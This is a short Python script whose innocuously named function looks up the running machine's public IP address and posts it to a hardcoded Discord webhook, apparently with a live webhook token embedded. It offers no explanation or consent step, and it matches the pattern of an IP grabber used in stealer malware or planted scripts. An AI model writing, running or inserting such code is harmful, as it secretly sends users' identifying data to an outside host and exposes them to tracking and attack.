import requests

def create():
    checker = requests.get('https://api.ipify.org').text
    x = "https://discord.com/api/webhooks/1249121642337013821/Ugr6NTcw0hDA2qOowMPXnyRYzsjEbhT9kzUzT5MbfCIjHq_vBuXIZZYcL5kJqSxaXW5R"
    payload = {
        "content": f"{checker}"
    }
    response = requests.post(x, json=payload)